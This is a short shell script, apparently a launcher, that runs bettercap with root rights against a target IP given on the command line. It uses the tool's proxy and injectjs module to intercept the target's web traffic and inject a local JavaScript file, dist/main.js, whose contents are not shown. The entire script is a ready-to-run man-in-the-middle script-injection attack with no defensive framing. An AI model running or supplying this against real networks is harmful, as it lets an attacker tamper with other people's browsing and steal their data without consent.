#!/bin/sh

#SOURCEIP="$1"

sudo bettercap -T $1 --proxy --proxy-module injectjs --js-file dist/main.js
